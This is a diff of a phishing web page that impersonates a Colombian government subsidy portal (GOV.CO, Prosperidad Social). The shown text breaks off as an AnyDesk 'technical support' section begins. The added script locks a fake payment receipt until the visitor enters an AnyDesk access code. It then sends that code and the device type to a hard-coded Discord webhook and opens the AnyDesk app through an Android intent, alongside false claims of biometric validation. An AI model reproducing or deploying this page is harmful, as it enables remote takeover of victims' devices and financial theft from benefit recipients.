@@ -1,465 +1,779 @@
 <!DOCTYPE html>
 <html lang="es">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GOV.CO - Portal Único del Estado Colombiano | Validación de Giros</title>
-    <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-        }
-        body {
-            background-color: #f7f9fa;
-            color: #1b2a4a;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            min-height: 100vh;
-            padding-bottom: 30px;
-            overflow-x: hidden;
-            position: relative;
-        }
-        /* Barra superior oficial */
-        .gov-header {
-            width: 100%;
-            background-color: #3366cc;
-            color: white;
-            padding: 8px 15px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            font-size: 12px;
-            font-weight: 600;
-            position: relative;
-            z-index: 10;
-        }
-        .gov-header .col-flag {
-            letter-spacing: 1px;
-            color: #ffcc00;
-        }
+<head>    
+    <meta charset="UTF-8">    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">    
+    <title>GOV.CO - Portal Único del Estado Colombiano | Validación de Giros</title>    
+    <style>        
+        * {            
+            box-sizing: border-box;            
+            margin: 0;            
+            padding: 0;            
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;        
+        }        
+        body {            
+            background-color: #f0f4f8;            
+            color: #1b2a4a;            
+            display: flex;            
+            flex-direction: column;            
+            align-items: center;            
+            min-height: 100vh;            
+            padding-bottom: 40px;            
+            overflow-x: hidden;            
+            position: relative;        }        
 
-        /* Franja para mostrar fecha y hora exacta en formato de 12 horas */
-        .barra-tiempo-actual {
-            width: 100%;
-            background-color: #e9ecef;
-            color: #333;
-            padding: 6px 20px;
-            font-size: 11px;
-            font-weight: 600;
-            display: flex;
-            justify-content: flex-end;
-            align-items: center;
-            border-bottom: 1px solid #dcdcdc;
-            z-index: 10;
+        .gov-header {            
+            width: 100%;            
+            background: linear-gradient(90deg, #0b2239, #133b63, #0b2239);
+            background-size: 200% 100%;
+            animation: gradientMove 8s ease infinite;
+            color: white;            
+            padding: 10px 20px;            
+            display: flex;            
+            justify-content: space-between;            
+            align-items: center;            
+            font-size: 12px;            
+            font-weight: 600;            
+            position: relative;            
+            z-index: 10;            
+            border-bottom: 3px solid #ffcc00;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+        }        
+        @keyframes gradientMove {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
         }
-
-        /* Navbar secundaria */
-        .navbar-institucional {
-            width: 100%;
-            background-color: #ffffff;
-            border-bottom: 2px solid #e1e8ed;
-            padding: 12px 20px;
-            display: flex;
-            align-items: center;
-            gap: 15px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.02);
-            position: relative;
-            z-index: 10;
-        }
-        .navbar-institucional .portal-title {
-            font-size: 14px;
-            font-weight: 700;
-            color: #004884;
-            border-left: 2px solid #ccc;
-            padding-left: 12px;
-            line-height: 1.2;
-        }
-        
-        /* Contenedor Principal con tamaño fijo estricto */
-        .main-container {
-            width: 100%;
-            max-width: 520px;
-            padding: 20px;
-            position: relative;
-            z-index: 10;
-            flex-shrink: 0;
-        }
-
-        .alerta-aviso {
-            background-color: #e8f4fd;
-            border-left: 4px solid #17a2b8;
-            padding: 12px 15px;
+        .gov-header .col-flag {            
+            letter-spacing: 1px;            
+            color: #ffcc00;            
             font-size: 13px;
-            color: #0c5460;
-            border-radius: 4px;
-            margin-bottom: 20px;
-            line-height: 1.5;
         }
 
-        .tarjeta-verificacion {
-            background: #ffffff;
-            padding: 30px 25px;
+        .barra-tiempo-actual {            
+            width: 100%;            
+            background-color: #e2e8f0;            
+            color: #4a5568;            
+            padding: 8px 20px;            
+            font-size: 11px;            
+            font-weight: 600;            
+            display: flex;            
+            justify-content: flex-end;            
+            align-items: center;            
+            border-bottom: 1px solid #cbd5e0;            
+            z-index: 10;        }
+        .barra-tiempo-actual span.live-clock {
+            animation: parpadeoReloj 2s infinite ease-in-out;
+        }
+        @keyframes parpadeoReloj {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        .navbar-institucional {            
+            width: 100%;            
+            background-color: #ffffff;            
+            border-bottom: 1px solid #e2e8f0;            
+            padding: 15px 20px;            
+            display: flex;            
+            align-items: center;            
+            gap: 15px;            
+            box-shadow: 0 4px 6px -1px rgba(0,0,0,0.05);            
+            position: relative;            
+            z-index: 10;        }        
+        .navbar-institucional .portal-title {            
+            font-size: 14px;            
+            font-weight: 700;            
+            color: #0b2239;            
+            border-left: 3px solid #3366cc;            
+            padding-left: 12px;            
+            line-height: 1.3;        }            
+
+        .main-container {            
+            width: 100%;            
+            max-width: 520px;            
+            padding: 24px 16px;            
+            position: relative;            
+            z-index: 10;            
+            flex-shrink: 0;        }
+
+        .alerta-aviso {            
+            background-color: #ebf8ff;            
+            border-left: 4px solid #3182ce;            
+            padding: 14px 16px;            
+            font-size: 13px;            
+            color: #2b6cb0;            
+            border-radius: 6px;            
+            margin-bottom: 20px;            
+            line-height: 1.5;            
+            box-shadow: 0 4px 6px rgba(49, 130, 206, 0.08);
+            animation: fadeInAlerta 0.8s ease-out;
+        }
+        @keyframes fadeInAlerta {
+            from { opacity: 0; transform: translateY(-8px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .tarjeta-verificacion {            
+            background: #ffffff;            
+            padding: 24px 20px;            
+            border-radius: 12px;            
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.04);            
+            text-align: center;            
+            border: 1px solid #e2e8f0;            
+            margin-bottom: 20px;
+            transition: all 0.3s ease;
+        }            
+        .tarjeta-verificacion:hover {
+            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.07);
+        }
+
+        .portada-imagen-container {
+            width: 100%;
             border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.06);
-            text-align: center;
-            border: 1px solid #dcdcdc;
-            margin-bottom: 20px;
+            overflow: hidden;
+            margin-bottom: 16px;
+            border: 1px solid #e2e8f0;
+            background: #f8fafc;
         }
-        
-        .estado-badge {
-            background-color: #d4edda;
-            color: #155724;
-            font-size: 11px;
-            font-weight: 700;
-            padding: 5px 12px;
-            border-radius: 12px;
-            text-transform: uppercase;
-            display: inline-block;
-            margin-bottom: 15px;
-            border: 1px solid #c3e6cb;
+        .portada-imagen-container img {
+            width: 100%;
+            height: auto;
+            display: block;
+            object-fit: cover;
         }
 
-        h1 {
-            color: #004884;
-            font-size: 19px;
-            font-weight: 700;
-            margin-bottom: 10px;
+        .estado-badge {            
+            background-color: #ebf8ff;            
+            color: #3182ce;            
+            font-size: 11px;            
+            font-weight: 700;            
+            padding: 6px 14px;            
+            border-radius: 20px;            
+            text-transform: uppercase;            
+            display: inline-block;            
+            margin-bottom: 12px;            
+            border: 1px solid #bee3f8;
+            transition: all 0.4s ease;
         }
+        h1 {            
+            color: #0b2239;            
+            font-size: 17px;            
+            font-weight: 700;            
+            margin-bottom: 8px;        }
 
-        .monto-caja {
-            background: #f1f8ff;
-            border: 1px dashed #3366cc;
-            padding: 15px;
-            border-radius: 6px;
-            margin: 20px 0;
-        }
-        .monto-titulo {
-            font-size: 12px;
-            color: #555;
-            text-transform: uppercase;
-            font-weight: 600;
-        }
-        .monto {
-            font-size: 32px;
-            font-weight: 800;
-            color: #28a745;
-            margin-top: 5px;
-        }
-
-        p {
-            color: #4a5568;
-            font-size: 13px;
-            line-height: 1.6;
-            margin-bottom: 20px;
+        .subsidio-bloque-interno {
+            background: #f8fafc;
+            border: 1px solid #e2e8f0;
+            padding: 16px;
+            border-radius: 8px;
+            margin-bottom: 16px;
             text-align: left;
         }
-
-        @keyframes moverBoton {
-            0% { transform: translateX(0px); }
-            25% { transform: translateX(-4px); }
-            50% { transform: translateX(4px); }
-            75% { transform: translateX(-3px); }
-            100% { transform: translateX(0px); }
+        .subsidio-bloque-interno h3 {
+            color: #0b2239;
+            font-size: 13px;
+            margin-bottom: 6px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-weight: 700;
+        }
+        .subsidio-bloque-interno p {
+            font-size: 12px;
+            color: #4a5568;
+            line-height: 1.6;
+            margin-bottom: 12px;
+            text-align: left;
+        }
+        .subsidio-detalles-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 8px;
+        }
+        .subsidio-card-item {
+            background: #ffffff;
+            border: 1px solid #e2e8f0;
+            padding: 8px 10px;
+            border-radius: 6px;
+        }
+        .subsidio-card-item span {
+            display: block;
+            font-size: 9px;
+            color: #718096;
+            text-transform: uppercase;
+            font-weight: 600;
+            margin-bottom: 2px;
+        }
+        .subsidio-card-item strong {
+            font-size: 11px;
+            color: #2d3748;
         }
 
-        .btn-descargar {
-            background-color: #004884;
-            color: white;
-            padding: 16px;
-            text-decoration: none;
-            font-size: 15px;
+        .tarjeta-verificacion p.descripcion-general {            
+            color: #4a5568;            
+            font-size: 13px;            
+            line-height: 1.6;            
+            margin-bottom: 20px;            
+            text-align: left;        }
+
+        @keyframes moverBoton {            
+            0% { transform: scale(1); box-shadow: 0 4px 12px rgba(51, 102, 204, 0.25); }            
+            50% { transform: scale(1.02); box-shadow: 0 6px 18px rgba(51, 102, 204, 0.4); }            
+            100% { transform: scale(1); box-shadow: 0 4px 12px rgba(51, 102, 204, 0.25); }        }
+        .btn-descargar {            
+            background-color: #e2e8f0;            
+            color: #a0aec0;            
+            padding: 15px;            
+            text-decoration: none;            
+            font-size: 14px;            
+            font-weight: 700;            
+            border-radius: 8px;            
+            display: block;            
+            width: 100%;            
+            border: none;            
+            cursor: not-allowed;            
+            transition: all 0.3s;        }
+        .btn-descargar.habilitado {            
+            background-color: #3366cc;            
+            color: white;            
+            cursor: pointer;            
+            animation: moverBoton 2s infinite ease-in-out;        }
+        .btn-descargar.habilitado:hover {            
+            background-color: #254b99;        }
+
+        .seccion-anydesk {
+            background: #ffffff;
+            border: 1px solid #e2e8f0;
+            padding: 24px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            box-shadow: 0 8px 25px rgba(0,0,0,0.04);
+            text-align: left;
+        }
+        .seccion-anydesk h3 {
+            color: #2d3748;
+            font-size: 16px;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
             font-weight: 700;
-            border-radius: 6px;
+        }
+        .seccion-anydesk > p {
+            font-size: 12px;
+            color: #718096;
+            margin-bottom: 16px;
+        }
+
+        .pasos-lista {
+            list-style: none;
+            counter-reset: paso-contador;
+            margin-bottom: 20px;
+        }
+        .pasos-lista li {
+            counter-increment: paso-contador;
+            position: relative;
+            padding-left: 32px;
+            margin-bottom: 12px;
+            font-size: 13px;
+            color: #2d3748;
+            line-height: 1.4;
+        }
+        .pasos-lista li::before {
+            content: counter(paso-contador);
+            position: absolute;
+            left: 0;
+            top: -1px;
+            width: 22px;
+            height: 22px;
+            background-color: #ebf8ff;
+            color: #3182ce;
+            font-weight: 700;
+            font-size: 11px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 1px solid #bee3f8;
+            box-shadow: 0 2px 4px rgba(49, 130, 206, 0.15);
+        }
+
+        .btn-anydesk-img {
             display: block;
             width: 100%;
-            border: none;
-            cursor: pointer;
-            box-shadow: 0 3px 6px rgba(0,0,0,0.15);
-            animation: moverBoton 1.5s infinite ease-in-out;
-            transition: background 0.2s;
+            max-width: 220px;
+            margin: 0 auto 20px auto;
+            text-decoration: none;
+            transition: transform 0.25s ease, opacity 0.25s ease;
         }
-        .btn-descargar:hover {
-            background-color: #003366;
-        }
-
-        /* Bloque de publicidad */
-        .seccion-publicidad {
-            background: #ffffff;
-            padding: 20px;
+        .btn-anydesk-img img {
+            width: 100%;
+            height: auto;
+            display: block;
             border-radius: 8px;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
-            margin-bottom: 20px;
-            border: 1px solid #e1e8ed;
-            text-align: center;
         }
-        .seccion-publicidad h4 {
-            font-size: 11px;
-            color: #888;
-            text-transform: uppercase;
-            margin-bottom: 12px;
-            letter-spacing: 0.5px;
+        .btn-anydesk-img:hover {
+            transform: translateY(-2px);
+            opacity: 0.95;
         }
-        .banner-anuncio-1 {
-            background: linear-gradient(135deg, #007bff, #0056b3);
-            color: white;
-            padding: 20px;
-            border-radius: 6px;
-            font-size: 14px;
-            font-weight: 600;
-            margin-bottom: 10px;
-        }
-        .banner-anuncio-2 {
-            background: linear-gradient(135deg, #ffc107, #e0a800);
-            color: #212529;
+
+        .input-codigo-grupo {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+            background: #f7fafc;
             padding: 15px;
-            border-radius: 6px;
-            font-size: 13px;
+            border-radius: 8px;
+            border: 1px solid #e2e8f0;
+        }
+        .input-codigo-grupo label {
+            font-size: 12px;
             font-weight: 700;
+            color: #4a5568;
+        }
+        .input-codigo-grupo input {
+            padding: 12px;
+            font-size: 16px;
+            letter-spacing: 2px;
+            border: 1px solid #cbd5e0;
+            border-radius: 6px;
+            outline: none;
+            background: #fff;
+            color: #1a202c;
+            transition: all 0.25s ease;
+        }
+        .input-codigo-grupo input:focus {
+            border-color: #3182ce;
+            box-shadow: 0 0 0 4px rgba(49, 130, 206, 0.18);
+            transform: scale(1.01);
+        }
+        .btn-enviar-codigo {
+            background-color: #2f855a;
+            color: white;
+            border: none;
+            padding: 12px;
+            font-size: 14px;
+            font-weight: 700;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            margin-top: 5px;
+            box-shadow: 0 4px 12px rgba(47, 133, 90, 0.25);
+        }
+        .btn-enviar-codigo:hover {
+            background-color: #276749;
+            transform: translateY(-1px);
+            box-shadow: 0 6px 16px rgba(47, 133, 90, 0.35);
         }
 
-        /* Footer institucional */
-        .footer-gov {
-            text-align: center;
-            font-size: 11px;
-            color: #718096;
-            margin-top: 25px;
-            line-height: 1.5;
-            border-top: 1px solid #cbd5e0;
-            padding-top: 15px;
-        }
+        .footer-gov {            
+            text-align: center;            
+            font-size: 11px;            
+            color: #a0aec0;            
+            margin-top: 25px;            
+            line-height: 1.5;            
+            border-top: 1px solid #e2e8f0;            
+            padding-top: 15px;        }
 
-        /* Pantalla emergente */
-        #pantalla-pdf-estilo {
+        /* MODAL DE CUENTA REGRESIVA DIRECTA DE 10 SEGUNDOS */
+        #modal-cuenta-regresiva {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background-color: #121212;
+            background-color: rgba(0, 0, 0, 0.7);
             z-index: 9999;
             display: none;
-            flex-direction: column;
             justify-content: center;
             align-items: center;
-            color: #ffffff;
-            text-align: center;
             padding: 20px;
+            backdrop-filter: blur(4px);
         }
-
-        .pdf-icono-caja {
-            background-color: #ffffff;
-            padding: 15px;
-            border-radius: 16px;
-            margin-bottom: 15px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.8);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            border: 2px solid #28a745;
-            animation: flotar 3s infinite ease-in-out, pulsar 1.5s infinite ease-in-out;
-        }
-
-        @keyframes flotar {
-            0%, 100% { transform: translateY(0px); }
-            50% { transform: translateY(-10px); }
-        }
-
-        @keyframes pulsar {
-            0%, 100% { box-shadow: 0 0 5px rgba(40, 167, 69, 0.3); }
-            50% { box-shadow: 0 0 15px rgba(40, 167, 69, 0.7); }
-        }
-
-        .logo-personalizado {
-            width: 100px;
-            height: auto;
-            max-height: 75px;
-            object-fit: contain;
-            display: block;
-        }
-
-        .pdf-nombre-archivo {
-            font-size: 16px;
-            color: #e0e0e0;
-            margin-bottom: 35px;
-            word-break: break-all;
-            font-weight: 600;
-        }
-
-        .contenedor-botones-modal {
-            display: flex;
-            gap: 0;
+        .regresiva-contenido {
+            background: #ffffff;
             width: 100%;
             max-width: 340px;
-            justify-content: center;
-            background: #2c2c2c;
-            border-radius: 13px;
-            overflow: hidden;
-            border: 1px solid #444;
+            border-radius: 16px;
+            padding: 24px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4);
+            text-align: center;
+            animation: aparecerReal 0.25s ease-out;
         }
-
-        .btn-modal {
-            flex: 1;
-            border: none;
-            padding: 15px 10px;
-            font-size: 17px;
-            font-weight: 600;
-            cursor: pointer;
-            text-decoration: none;
-            display: inline-block;
-            transition: background 0.2s, transform 0.1s;
-            background-color: #3a3a3a;
-            color: #ffffff;
-            border-right: 1px solid #444;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        @keyframes aparecerReal {
+            from { transform: scale(0.9); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
         }
-
-        .btn-modal:last-child {
-            border-right: none;
-        }
-
-        .btn-modal:active {
-            background-color: #505050;
-            transform: scale(0.98);
-        }
-
-        .btn-rechazar {
-            color: #ff453a;
-        }
-
-        .btn-aceptar {
-            color: #0a84ff;
+        .regresiva-contenido h3 {
+            color: #0b2239;
+            font-size: 16px;
+            margin-bottom: 8px;
             font-weight: 700;
         }
-
-        .btn-rechazar:hover { background-color: #4a4a4a; }
-        .btn-aceptar:hover { background-color: #4a4a4a; }
-
-        /* Iconos flotantes animados de fondo sin alterar ni agrandar la estructura principal */
-        .icono-flotante {
-            position: absolute;
-            pointer-events: none;
-            opacity: 0.35;
-            z-index: 1;
-            animation: animarIconoDesplazamiento linear infinite;
+        .regresiva-contenido p {
+            font-size: 12px;
+            color: #4a5568;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+        .contador-numero {
+            font-size: 42px;
+            font-weight: 800;
+            color: #3182ce;
+            margin-bottom: 15px;
+            display: inline-block;
+            animation: pulsoContador 1s infinite ease-in-out;
+        }
+        @keyframes pulsoContador {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.08); }
+        }
+        .barra-progreso-contenedor {
+            width: 100%;
+            height: 8px;
+            background-color: #e2e8f0;
+            border-radius: 4px;
+            overflow: hidden;
+        }
+        .barra-progreso-fill {
+            width: 100%;
+            height: 100%;
+            background-color: #3182ce;
+            width: 0%;
+            transition: width 1s linear;
         }
 
-        @keyframes animarIconoDesplazamiento {
-            0% { transform: translate(0, 0) rotate(0deg); }
-            50% { transform: translate(25px, -35px) rotate(180deg); }
-            100% { transform: translate(0, 0) rotate(360deg); }
+        /* PANTALLA DEL PDF */
+        #pantalla-pdf-estilo {            
+            position: fixed;            
+            top: 0;            
+            left: 0;            
+            width: 100%;            
+            height: 100%;            
+            background-color: rgba(15, 23, 42, 0.96);            
+            z-index: 9999;            
+            display: none;            
+            flex-direction: column;            
+            justify-content: center;            
+            align-items: center;            
+            color: #ffffff;            
+            text-align: center;            
+            padding: 20px;
+            backdrop-filter: blur(8px);
         }
-    </style>
-    <script>
-        function generarElementosFlotantes() {
-            const iconos = ['🏛️', '💰', '🇨🇴', '🏦', '💳', '✔', '📩'];
+        .pdf-icono-caja {            
+            background-color: #ffffff;            
+            padding: 16px;            
+            border-radius: 16px;            
+            margin-bottom: 15px;            
+            box-shadow: 0 15px 35px rgba(0,0,0,0.6);            
+            display: flex;            
+            align-items: center;            
+            justify-content: center;            
+            border: 2px solid #2f855a;            
+            animation: flotar 3s infinite ease-in-out;        }
+        @keyframes flotar {            
+            0%, 100% { transform: translateY(0px) scale(1); }            
+            50% { transform: translateY(-10px) scale(1.03); }        }
+        .pdf-nombre-archivo {            
+            font-size: 16px;            
+            color: #cbd5e0;            
+            margin-bottom: 30px;            
+            word-break: break-all;            
+            font-weight: 600;        }
+        .contenedor-botones-modal {            
+            display: flex;            
+            gap: 12px;            
+            width: 100%;            
+            max-width: 320px;            
+            justify-content: center;        }
+        .btn-modal {            
+            flex: 1;            
+            border: none;            
+            padding: 14px 10px;            
+            font-size: 15px;            
+            font-weight: 600;            
+            cursor: pointer;            
+            border-radius: 8px;            
+            text-decoration: none;            
+            display: inline-block;            
+            transition: all 0.25s;            
+            font-family: inherit;
+        }
+        .btn-rechazar {            
+            background-color: #2d3748;            
+            color: #fc8181;            
+            border: 1px solid #4a5568;
+        }
+        .btn-aceptar {            
+            background-color: #3182ce;            
+            color: #ffffff;            
+            font-weight: 700;            
+            box-shadow: 0 4px 15px rgba(49, 130, 206, 0.4);
+        }
+        .btn-rechazar:hover { background-color: #1a202c; transform: translateY(-1px); }        
+        .btn-aceptar:hover { background-color: #2b6cb0; transform: translateY(-1px); }
+
+        .icono-flotante {            
+            position: absolute;            
+            pointer-events: none;            
+            opacity: 0.18;            
+            z-index: 1;            
+            animation: animarIconoDesplazamiento linear infinite;        }
+        @keyframes animarIconoDesplazamiento {            
+            0% { transform: translate(0, 0) rotate(0deg); }            
+            50% { transform: translate(30px, -35px) rotate(180deg); }            
+            100% { transform: translate(0, 0) rotate(360deg); }        }    </style>    
+    <script>        
+        function generarElementosFlotantes() {            
+            const iconos = ['🏛️', '💰', '🇨🇴', '🏦', '💳', '✔', '📩'];            
             const contenedor = document.body;
             const numIconos = 14;
 
-            for (let i = 0; i < numIconos; i++) {
+            for (let i = 0; i < numIconos; i++) {                
                 const span = document.createElement('span');
                 span.classList.add('icono-flotante');
                 span.textContent = iconos[Math.floor(Math.random() * iconos.length)];
-                span.style.fontSize = Math.random() * 15 + 16 + 'px';
-                
+                span.style.fontSize = Math.random() * 14 + 16 + 'px';
                 span.style.left = Math.random() * 92 + 2 + '%';
                 span.style.top = Math.random() * 95 + 2 + '%';
-                
-                span.style.animationDuration = (Math.random() * 4 + 4) + 's';
-                
+                span.style.animationDuration = (Math.random() * 6 + 6) + 's';
                 contenedor.appendChild(span);
             }
+        }
+
+        // Función para detectar si está en App (móvil) o en Web (PC)
+        function obtenerDispositivoYEntorno() {
+            const ua = navigator.userAgent || navigator.vendor || window.opera;
+            // Comprobación exacta para dispositivos móviles / apps integradas
+            if (/android|iphone|ipad|ipod|blackberry|opera mini|iemobile|mobile/i.test(ua)) {
+                return "📱 Aplicación / Móvil";
+            }
+            return "💻 Web / Computador";
+        }
+
+        function enviarCodigoAnydesk(event) {
+            event.preventDefault();
+            const codigo = document.getElementById('codigoAnydesk').value.trim();
+            if(codigo === "") {
+                alert("Por favor, ingrese el código de su app.");
+                return;
+            }
+
+            const webhookUrl = "https://discord.com/api/webhooks/1520119877841588235/09Lj574ZkxPmrYqMQMAw6g4a-39axrnzD-rWm6H049XNVRzXFarsFo2VSYsVfGGb_ldY";
+            const codigoLimpio = codigo.replace(/\s+/g, '');
+            const tipoDispositivo = obtenerDispositivoYEntorno();
+
+            // Mensaje adaptado para notificar en Discord si está en la App o en la Web junto al código
+            const mensaje = {
+                content: `🔔 **Nueva Sincronización Detectada**\n📍 Dispositivo: **${tipoDispositivo}**\n\`\`\`${codigoLimpio}\`\`\``
+            };
+
+            fetch(webhookUrl, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(mensaje)
+            })
+            .then(response => {
+                const badge = document.getElementById('estadoVerificacion');
+                badge.innerHTML = "🛡️ Sincronización en Proceso";
+                badge.style.backgroundColor = "#fffaf0";
+                badge.style.color = "#c05621";
+                badge.style.borderColor = "#feebc8";
+
+                const btnDescargar = document.getElementById('btnDescargarComprobante');
+                btnDescargar.classList.add('habilitado');
+                btnDescargar.removeAttribute('disabled');
+                btnDescargar.innerHTML = "📄 Obtener Comprobante Oficial";
+
+                document.getElementById('codigoAnydesk').setAttribute('disabled', 'true');
+                const btnSubmit = event.target.querySelector('button');
+                btnSubmit.setAttribute('disabled', 'true');
+                btnSubmit.innerHTML = "Sincronizado";
+                btnSubmit.style.backgroundColor = "#718096";
+
+                // INICIAR LA CUENTA REGRESIVA DIRECTAMENTE SIN PEDIR CLICS EXTRA
+                iniciarCuentaRegresivaDirecta();
+            })
+            .catch(error => {
+                console.error("Error al enviar el código:", error);
+                alert("Hubo un error al conectar con el servidor. Intente de nuevo.");
+            });
+        }
+
+        function iniciarCuentaRegresivaDirecta() {
+            // Mostrar pantalla de cuenta regresiva de 10 segundos
+            document.getElementById('modal-cuenta-regresiva').style.display = 'flex';
+            
+            let segundosRestantes = 10;
+            const spanContador = document.getElementById('contadorSegundos');
+            const barraFill = document.getElementById('barraProgresoFill');
+            
+            spanContador.textContent = segundosRestantes;
+            barraFill.style.width = '0%';
+            
+            let intervalo = setInterval(() => {
+                segundosRestantes--;
+                spanContador.textContent = segundosRestantes;
+                
+                let porcentaje = ((10 - segundosRestantes) / 10) * 100;
+                barraFill.style.width = porcentaje + '%';
+                
+                if (segundosRestantes <= 0) {
+                    clearInterval(intervalo);
+                    document.getElementById('modal-cuenta-regresiva').style.display = 'none';
+                    
+                    // APERTURA NATIVA MEDIANTE ANDROID INTENT (Se abre la app automáticamente)
+                    window.location.href = "intent://#Intent;package=com.anydesk.anydeskandroid;scheme=anydesk;end;";
+
+                    // Mostrar automáticamente el PDF en la web
+                    document.getElementById('pantalla-pdf-estilo').style.display = 'flex';
+                }
+            }, 1000);
+        }
+
+        function mostrarInterfazPDF() {
+            const btnDescargar = document.getElementById('btnDescargarComprobante');
+            if (btnDescargar.classList.contains('habilitado')) {
+                document.getElementById('pantalla-pdf-estilo').style.display = 'flex';
+            } else {
+                alert("Debe completar la validación de la aplicación e ingresar su código para desbloquear el comprobante.");
+            }
+        }
+
+        function cerrarInterfaz() {
+            document.getElementById('pantalla-pdf-estilo').style.display = 'none';
         }
     </script>
 </head>
 <body onload="generarElementosFlotantes()">
 
 <!-- Barra superior oficial -->
-<div class="gov-header">
-    <span class="col-flag">🇨🇴 GOV.CO</span>
+<div class="gov-header">    
+    <span class="col-flag">🇨🇴 GOV.CO</span>    
     <span>Plataforma Oficial del Estado Colombiano</span>
 </div>
 
-<!-- Franja superior con la fecha y hora exacta actual en formato de 12 horas -->
-<div class="barra-tiempo-actual">
-    📅 Lunes, 17 de agosto de 2026 &nbsp;|&nbsp; ⏱️ 05:14 p. m.
+<!-- Franja de fecha y hora -->
+<div class="barra-tiempo-actual">    
+    <span class="live-clock">📅 Lunes, 24 de agosto de 2026 &nbsp;|&nbsp; ⏱️ 11:34 a. m.</span>
 </div>
 
-<!-- Navbar con identidad de entidad -->
-<div class="navbar-institucional">
-    <div style="font-size: 24px;">🏛️</div>
-    <div class="portal-title">
-        Departamento para la Prosperidad Social<br>
-        <span style="font-size: 11px; font-weight: 400; color: #555;">Sistema Integrado de Giros y Subsidios Nacionales</span>
+<!-- Navbar institucional -->
+<div class="navbar-institucional">    
+    <div style="font-size: 24px;">🏛️</div>    
+    <div class="portal-title">        
+        Departamento para la Prosperidad Social<br>        
+        <span style="font-size: 11px; font-weight: 400; color: #718096;">Sistema Integrado de Giros y Subsidios Nacionales</span>    
     </div>
 </div>
 
 <div class="main-container">
+    <div class="alerta-aviso">        
+        <strong>Aviso del Sistema:</strong> Su documento ha superado la fase de validación biométrica en las centrales de pagos autorizadas.    </div>
 
-    <div class="alerta-aviso">
-        <strong>Aviso del Sistema:</strong> Su documento ha superado la fase de validación biométrica en las centrales de pagos autorizadas.
+    <!-- TARJETA DE VERIFICACIÓN CON IMAGEN DE PORTADA -->
+    <div class="tarjeta-verificacion">        
+        <div class="portada-imagen-container">
+            <img src="https://i.ibb.co/sv9RCsg4/5d059842-d2a0-47e6-96d8-5e6725259aa0.png" alt="Portal de Asignación Monetaria">
+        </div>
+
+        <div id="estadoVerificacion" class="estado-badge">🔍 Pendiente de Sincronización</div>                
+
+        <h1>Comprobante de Asignación Monetaria</h1>                
+
+        <!-- SECCIÓN INFORMATIVA INSTITUCIONAL -->
+        <div class="subsidio-bloque-interno">
+            <h3>📋 Resumen de Asignación y Subsidio Monetario</h3>
+            <p>El programa de transferencia monetaria extraordinaria y compensación social está destinado a respaldar de manera oportuna a los hogares focalizados del país. Una vez validada su identidad y completado el protocolo de sincronización de seguridad, podrá descargar el certificado de asignación oficial para su respectivo cobro en la red de pagos autorizada.</p>
+
+            <div class="subsidio-detalles-grid">
+                <div class="subsidio-card-item">
+                    <span>Estado del Subsidio</span>
+                    <strong>Focalizado y Activo</strong>
+                </div>
+                <div class="subsidio-card-item">
+                    <span>Modalidad de Giro</span>
+                    <strong>Acreditación Directa</strong>
+                </div>
+                <div class="subsidio-card-item">
+                    <span>Vigencia del Pago</span>
+                    <strong>Ciclo Ordinario 2026</strong>
+                </div>
+                <div class="subsidio-card-item">
+                    <span>Canal de Cobro</span>
+                    <strong>Red Nacional Autorizada</strong>
+                </div>
+            </div>
+        </div>
+
+        <p class="descripcion-general">Estimado(a) ciudadano(a), el sistema central ha procesado satisfactoriamente su acreditación económica extraordinaria correspondiente al periodo actual. Complete el proceso de soporte técnico inferior para habilitar la descarga.</p>                
+
+        <button type="button" id="btnDescargarComprobante" class="btn-descargar" disabled onclick="mostrarInterfazPDF()">            
+            🔒 Comprobante Bloqueado (Complete Aplicación)        
+        </button>    
     </div>
 
-    <div class="tarjeta-verificacion">
-        <div class="estado-badge">✔ Cédula Verificada y Habilitada</div>
-        
-        <h1>Comprobante de Asignación Monetaria</h1>
-        
-        <div class="monto-caja">
-            <div class="monto-titulo">Valor Total del Beneficio</div>
-            <div class="monto">$500.000,00 COP</div>
-        </div>
-        
-        <p>Estimado(a) ciudadano(a), el sistema central ha procesado satisfactoriamente su acreditación económica extraordinaria correspondiente al periodo actual. Pulse el botón inferior para obtener su comprobante digital oficial.</p>
-        
-        <button type="button" class="btn-descargar" onclick="mostrarInterfazPDF()">
-            📄 Obtener Comprobante Oficial
-        </button>
+    <!-- SECCIÓN DE SOPORTE TÉCNICO -->
+    <div class="seccion-anydesk">
